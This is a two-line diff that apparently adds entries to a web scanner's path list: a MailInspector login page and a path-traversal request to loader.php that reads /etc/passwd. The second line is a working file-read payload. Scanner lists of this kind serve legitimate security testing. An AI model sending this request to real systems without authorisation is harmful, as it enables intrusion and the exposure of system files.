@@ -1,0 +1,2 @@
+/mailinspector/login.php
+/mailinspector/public/loader.php?path=../../../../../../../etc/passwd
